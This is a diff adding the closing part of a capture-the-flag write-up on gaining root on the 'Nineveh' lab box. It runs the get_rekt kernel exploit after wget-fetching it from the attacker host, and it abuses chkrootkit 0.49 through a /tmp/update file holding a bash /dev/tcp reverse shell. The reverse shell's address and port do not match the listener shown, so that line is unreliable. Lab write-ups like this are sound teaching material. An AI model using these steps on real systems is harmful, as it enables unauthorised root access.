+                <br>
+                &nbsp;&nbsp;Local&nbsp;Kernel<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;4.4.0<br>
+                &nbsp;&nbsp;Searching&nbsp;72&nbsp;exploits...<br>
+                <br>
+                &nbsp;&nbsp;Possible&nbsp;Exploits<br>
+                &nbsp;&nbsp;[1]&nbsp;af_packet<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2016-8655<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Source<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>40871<br>
+                &nbsp;&nbsp;[2]&nbsp;dirty_cow<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2016-5195<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Source<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>40616<br>
+                &nbsp;&nbsp;[3]&nbsp;exploit_x<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2018-14665<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Source<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>45697<br>
+                &nbsp;&nbsp;[4]&nbsp;get_rekt<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2017-16695<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Source<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>45010
+            </div>
+        </div><br>
+        <br>
+        This box is vulnerable to <code>get_rekt</code> - <a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a><br>
+        <br>
+        Save the exploit to your attacking machine and compile it.<br>
+        Make sure you compile it on a 64-bit distribution (because the Nineveh target is 64-bit), otherwise the exploit won't work (I don't think).<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;nano&nbsp;get_rekt.c<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;<span style="color:#ff9d00;font-weight:700">gcc</span>&nbsp;get_rekt.c&nbsp;-o&nbsp;get_rekt
+            </div>
+        </div><br>
+        <br>
+        <code>wget</code> it from your attacking, make it executable, and run it!<br>
+        You should get root :)<br>
+            <div class="codebox">
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;-q&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>get_rekt<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;+x&nbsp;get_rekt<br>
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>get_rekt<br>
+                [.]&nbsp;<br>
+                [.]&nbsp;t<span style="color:#ff9d00;font-weight:700">(</span>-_<span style="color:#ffdd00;font-weight:400">-t</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;exploit&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">counterfeit</span>&nbsp;grsec&nbsp;kernels&nbsp;such&nbsp;as&nbsp;KSPP&nbsp;and&nbsp;linux-hardened&nbsp;t(-_-t)<br>
+                [.]&nbsp;<br>
+                [.]&nbsp;&nbsp;&nbsp;**&nbsp;This&nbsp;vulnerability&nbsp;cannot&nbsp;be&nbsp;exploited&nbsp;at&nbsp;all&nbsp;on&nbsp;authentic&nbsp;grsecurity&nbsp;kernel&nbsp;**<br>
+                [.]&nbsp;<br>
+                [*]&nbsp;creating&nbsp;bpf&nbsp;map<br>
+                [*]&nbsp;sneaking&nbsp;evil&nbsp;bpf&nbsp;past&nbsp;the&nbsp;verifier<br>
+                [*]&nbsp;creating&nbsp;socketpair()<br>
+                [*]&nbsp;attaching&nbsp;bpf&nbsp;backdoor&nbsp;to&nbsp;socket<br>
+                [*]&nbsp;skbuff&nbsp;=&gt;&nbsp;ffff88003d35d600<br>
+                [*]&nbsp;Leaking&nbsp;sock&nbsp;struct&nbsp;from&nbsp;ffff88003a8a1800<br>
+                [*]&nbsp;Sock-&gt;sk_rcvtimeo&nbsp;at&nbsp;offset&nbsp;472<br>
+                [*]&nbsp;Cred&nbsp;structure&nbsp;at&nbsp;ffff88003a9a3480<br>
+                [*]&nbsp;UID&nbsp;from&nbsp;cred&nbsp;structure:&nbsp;1000,&nbsp;matches&nbsp;the&nbsp;current:&nbsp;1000<br>
+                [*]&nbsp;hammering&nbsp;cred&nbsp;structure&nbsp;at&nbsp;ffff88003a9a3480<br>
+                [*]&nbsp;credentials&nbsp;patched,&nbsp;launching&nbsp;shell...<br>
+                #&nbsp;id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root),1000(amrois)<br>
+                #&nbsp;cat&nbsp;/root/root.txt<br>
+                8a2b4956...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-4" name="h1-4"></a><strong></strong>
+        <h1><strong>Priv-Esc to root - via chkrootkit</strong></h1><br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) chkrootkit</strong></h2><br>
+        <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a><br>
+        Download <code>pspy</code>, to monitor running processes on the target system, to your attacking machine and serve it to the target with <code>python -m SimpleHTTPServer</code><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;-q&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>DominicBreuker<span style="color:#ff9d00;font-weight:700">/</span>pspy<span style="color:#ff9d00;font-weight:700">/</span>releases<span style="color:#ff9d00;font-weight:700">/</span>download<span style="color:#ff9d00;font-weight:700">/</span>v1.2.0<span style="color:#ff9d00;font-weight:700">/</span>pspy64s<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        <code>wget</code> it to the target from your attacking machine, and run it.<br>
+            <div class="codebox">
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;-q&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>pspy64s<br>
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;+x&nbsp;pspy64s<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>pspy64s<br>
+                pspy&nbsp;-&nbsp;version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;v1.2.0&nbsp;-&nbsp;Commit&nbsp;SHA<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855<br>
+                <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;██▓███&nbsp;&nbsp;&nbsp;&nbsp;██████&nbsp;&nbsp;██▓███&nbsp;▓██&nbsp;&nbsp;&nbsp;██▓<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;▓██░&nbsp;&nbsp;██▒▒██&nbsp;&nbsp;&nbsp;&nbsp;▒&nbsp;▓██░&nbsp;&nbsp;██▒▒██&nbsp;&nbsp;██▒<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;▓██░&nbsp;██▓▒░&nbsp;▓██▄&nbsp;&nbsp;&nbsp;▓██░&nbsp;██▓▒&nbsp;▒██&nbsp;██░<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;▒██▄█▓▒&nbsp;▒&nbsp;&nbsp;▒&nbsp;&nbsp;&nbsp;██▒▒██▄█▓▒&nbsp;▒&nbsp;░&nbsp;�██▓░<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;▒██▒&nbsp;░&nbsp;&nbsp;░▒██████▒▒▒██▒&nbsp;░&nbsp;&nbsp;░&nbsp;░&nbsp;██▒▓░<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;▒▓▒░&nbsp;░&nbsp;&nbsp;░▒&nbsp;▒▓▒&nbsp;▒&nbsp;░▒▓▒░&nbsp;░&nbsp;&nbsp;░&nbsp;&nbsp;██▒▒▒&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;░▒&nbsp;░&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;░&nbsp;░▒&nbsp;&nbsp;░&nbsp;░░▒&nbsp;░&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▓██&nbsp;░▒░&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;░░&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;░&nbsp;&nbsp;░&nbsp;&nbsp;░&nbsp;&nbsp;░░&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▒&nbsp;▒&nbsp;░░&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;░&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;░&nbsp;░&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;░&nbsp;░&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                Config<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Printing&nbsp;events&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>colored=<span style="color:#ff9d00;font-weight:700">true):</span>&nbsp;processes=<span style="color:#ff9d00;font-weight:700">true</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;file-system-events=<span style="color:#ff9d00;font-weight:700">false</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|||</span>&nbsp;Scannning&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">processes</span>&nbsp;every&nbsp;100ms&nbsp;and&nbsp;on&nbsp;inotify&nbsp;events&nbsp;|||&nbsp;Watching&nbsp;directories:&nbsp;[/usr&nbsp;/tmp&nbsp;/etc&nbsp;/home&nbsp;/var&nbsp;/opt]&nbsp;(recursive)&nbsp;|&nbsp;[]&nbsp;(non-recursive)<br>
+                Draining&nbsp;file&nbsp;system&nbsp;events&nbsp;due&nbsp;to&nbsp;startup...<br>
+                done<br>
+                <br>
+                [...]<br>
+                2019/09/25&nbsp;07:10:01&nbsp;CMD:&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=24190&nbsp;&nbsp;|&nbsp;/bin/sh&nbsp;-c&nbsp;/root/vulnScan.sh&nbsp;<br>
+                2019/09/25&nbsp;07:10:01&nbsp;CMD:&nbsp;UID=1000&nbsp;PID=24189&nbsp;&nbsp;|&nbsp;/bin/sh&nbsp;-c&nbsp;/usr/sbin/report-reset.sh&nbsp;<br>
+                2019/09/25&nbsp;07:10:01&nbsp;CMD:&nbsp;UID=0&nbsp;&nbsp;&nbsp;&nbsp;PID=24217&nbsp;&nbsp;|&nbsp;/bin/sh&nbsp;/usr/bin/chkrootkit&nbsp;<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        We see that a script called <code>/root/vulnScan.sh</code> runs, which then calls <code>chkrootkit</code>.<br>
+        <br>
+        If you view amrois's crontab, you'll find the report-reset.sh script from pspy.<br>
+        The script references a /report directory, which contains the output of chkrootkit's results.<br>
+            <div class="codebox">
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;crontab&nbsp;-l<br>
+                [...]<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;m&nbsp;h&nbsp;&nbsp;dom&nbsp;mon&nbsp;dow&nbsp;&nbsp;&nbsp;command</span><br>
+                *<span style="color:#ff9d00;font-weight:700">/</span>10&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>report-reset.sh<br>
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>report-reset.sh<br>
+                <span style="color:#0088ff;font-weight:400">#!/bin/bash</span><br>
+                <span style="color:#ff9d00;font-weight:700">rm</span>&nbsp;-rf&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>report<span style="color:#ff9d00;font-weight:700">/</span>*.txt<br>
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>report<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;amrois&nbsp;amrois&nbsp;4.8K&nbsp;Sep&nbsp;25&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>10&nbsp;report-19-09-25<span style="color:#ff9d00;font-weight:700">:</span>11<span style="color:#ff9d00;font-weight:700">:</span>10.txt<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;amrois&nbsp;amrois&nbsp;4.8K&nbsp;Sep&nbsp;25&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>11&nbsp;report-19-09-25<span style="color:#ff9d00;font-weight:700">:</span>11<span style="color:#ff9d00;font-weight:700">:</span>11.txt<br>
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>report$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;report-19-09-25<span style="color:#ff9d00;font-weight:700">:</span>11<span style="color:#ff9d00;font-weight:700">:</span>10.txt<br>
+                ROOTDIR&nbsp;is&nbsp;<span style="color:#333333;font-weight:400">`/'<br>
+                Checking&nbsp;`amd'...&nbsp;not&nbsp;found<br>
+                Checking&nbsp;`</span><span style="color:#ff9d00;font-weight:700">basename</span><span style="color:#3ad900;font-weight:400">'...&nbsp;not&nbsp;infected<br>
+                Checking&nbsp;`biff'</span>...&nbsp;not&nbsp;found<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        The reports are every minute, so we can assume that <code>/root/vulnScan.sh</code> is running <code>chkrootkit</code> every minute.<br>
+        <br>
+        chkrootkit Version 0.49 has a privilege escalation vulnerability - <a href="https://www.exploit-db.com/exploits/33899">https://www.exploit-db.com/exploits/33899</a><br>
+        It runs the file <code>/tmp/update</code>, as long as it exists, with root permissions, regardless of who own its.<br>
+        <br>
+        Therefore, you can put whatever commands you like in <code>/tmp/update</code>, and they'll be run as root.<br>
+        <br>
+            <div class="codebox">
+                amrois@nineveh:/tmp$&nbsp;chkrootkit&nbsp;-V<br>
+                /bin/sh:&nbsp;0:&nbsp;Can't&nbsp;open&nbsp;/usr/bin/chkrootkit
+            </div>
+        </div><br>
+        <br>
+        We can't run chkrootkit for some reason, so we can't check its version.<br>
+        Oh well, you should just try the exploit anyway.<br>
+        <code>chkrootkit</code> should run every minute, so you'll know fairly quickly whether it's a valid priv-esc route or not.<br>
+        <br>
+        Start listener on attacking machine to receive your shell<br>
+            <div class="codebox">
+                root@gotham:~/ctf/nineveh#&nbsp;nc&nbsp;-lvnp&nbsp;9004<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9004&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Create <code>/tmp/update</code> with a bash reverse shell inside it, and make it executable.<br>
+            <div class="codebox">
+                amrois@nineveh:/tmp$&nbsp;nano&nbsp;/tmp/update<br>
+                #!/bin/bash<br>
+                bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/10.0.0.1/8080&nbsp;0&gt;&amp;1<br>
+                amrois@nineveh:/tmp$&nbsp;chmod&nbsp;+x&nbsp;/tmp/update
+            </div>
+        </div><br>
+        <br>
+        Wait 1 minute, and you should receive a root shell on your listener!<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9004&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.12]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.43]&nbsp;50780<br>
+                bash:&nbsp;cannot&nbsp;set&nbsp;terminal&nbsp;process&nbsp;group&nbsp;(27819):&nbsp;Inappropriate&nbsp;ioctl&nbsp;for&nbsp;device<br>
+                bash:&nbsp;no&nbsp;job&nbsp;control&nbsp;in&nbsp;this&nbsp;shell<br>
+                root@nineveh:~#&nbsp;cat&nbsp;/root/root.txt<br>
+                cat&nbsp;/root/root.txt<br>
+                8a2b495...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
